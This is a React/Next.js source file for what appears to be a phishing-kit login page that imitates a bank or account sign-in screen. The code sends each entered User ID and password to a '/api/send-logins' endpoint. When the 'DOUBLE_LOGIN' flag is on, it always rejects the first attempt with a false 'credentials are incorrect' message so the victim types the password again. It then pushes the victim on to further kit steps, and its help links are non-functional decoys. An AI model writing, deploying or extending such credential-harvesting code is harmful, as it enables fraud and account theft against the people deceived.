import { Box, Link, TextField, Typography } from "@mui/material";
import React, { useContext, useState } from "react";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import { Wrapper } from "../components/Wrapper";
import { Button } from "../components/Button";
import { Notification } from "../components/Notification";
import { NotificationMobile } from "../components/NotificationMobile";
import { useRouter } from "next/router";
import { DataContext } from "./_app";
import axios from "axios";
import { getNextUrl } from "../utils/getNextUrl";
import { getProgress } from "../utils/getProgress";

interface LoginProps {}

const schema = yup.object().shape({
  userId: yup.string().required(`User ID required`),
  password: yup.string().required(`Password required`).min(6),
});

const Login: React.FC<LoginProps> = ({}) => {
  const [loginAttempt, setLoginAttempt] = useState(0);
  const [showError, setShowError] = useState(false);
  const [showPasswordForm, setShowPasswordForm] = useState(false);
  const [loading, setLoading] = useState(false);

  const [logins, setLogins] = useState({});
  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    reset,
    formState: { errors },
    watch,
    clearErrors,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onBlur`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `LOGIN`);
    formData.append(
      `loginDetails`,
      JSON.stringify({
        loginAttempt: loginAttempt + 1,
        sessionId: datas.sessionId,
        ...data,
      })
    );

    try {
      await axios.post(`/api/send-logins`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setLogins({
      ...logins,
      [loginAttempt + 1]: {
        form: `LOGIN`,
        loginDetails: { loginAttempt: loginAttempt + 1, ...data },
      },
    });

    if (!loginAttempt && process.env.NEXT_PUBLIC_DOUBLE_LOGIN === `ON`) {
      setLoginAttempt(1);
      setLoading(false);
      setShowError(true);
      setShowError(true);
      setShowPasswordForm(false);
      reset({
        userId: ``,
        password: ``,
      });
      return;
    }

    setData({
      ...datas,
      logins: {
        ...logins,
        [loginAttempt + 1]: {
          form: `LOGIN`,
          loginDetails: { loginAttempt: loginAttempt + 1, ...data },
        },
      },
    });

    const url = getProgress()[0];

    push(getNextUrl(url));
  });

  return (
    <>
      {showError ? (
        <>
          <Notification
            message={`Your account credentials are incorrect. Please try again.`}
          />
          <NotificationMobile
            open={showError}
            setOpen={setShowError}
            message={`Your account credentials are incorrect. Please try again.`}
          />
        </>
      ) : null}
      <Wrapper title={`Login`}>
        <Box component={`form`}>
          <TextField
            label="User ID"
            variant="standard"
            fullWidth
            error={errors.userId && errors.userId.message}
            helperText={errors.userId && errors.userId.message}
            {...register(`userId`)}
            sx={{
              display: showPasswordForm ? `none` : `block`,
            }}
          />
          <TextField
            error={errors.password && errors.password.message}
            label="Password"
            helperText={errors.password && errors.password.message}
            variant="standard"
            type={`password`}
            fullWidth
            {...register(`password`)}
            sx={{
              display: showPasswordForm ? `block` : `none`,
            }}
          />
          <Button
            variant="contained"
            sx={{
              height: `36px`,
              textIndent: `0.0892857143em`,
              letterSpacing: `.0892857143em`,
              padding: `0 16px`,
              marginRight: `12px`,
            }}
            disabled={loading}
            onClick={() => {
              if (watch(`userId`)) {
                setShowPasswordForm(true);
                clearErrors(`password`);
              }
              onSubmit();
            }}
          >
            Login
          </Button>
        </Box>
        <Typography
          component={`p`}
          sx={{
            fontSize: `.875rem`,
            fontFamily: `Roboto,sans-serif`,
            fontWeight: 400,
            lineHeight: `1.25rem`,
            letterSpacing: `.0178571429em`,
            marginTop: `24px`,
            marginBottom: `16px`,
          }}
        >
          First time logging in?{" "}
          <Link
            sx={{
              color: `#337ab7`,
              textDecoration: `none`,
              cursor: `pointer`,
            }}
          >
            Enroll Now
          </Link>
        </Typography>
        <Typography
          component={`p`}
          sx={{
            fontSize: `.875rem`,
            fontFamily: `Roboto,sans-serif`,
            fontWeight: 400,
            lineHeight: `1.25rem`,
            letterSpacing: `.0178571429em`,
            marginBottom: `16px`,
          }}
        >
          <Link
            sx={{
              color: `#337ab7`,
              textDecoration: `none`,
              cursor: `pointer`,
            }}
          >
            Forgot Password
          </Link>{" "}
          or need other assistance?{" "}
          <Link
            sx={{
              color: `#337ab7`,
              textDecoration: `none`,
              cursor: `pointer`,
            }}
          >
            Contact Us
          </Link>
        </Typography>
      </Wrapper>
    </>
  );
};

export default Login;
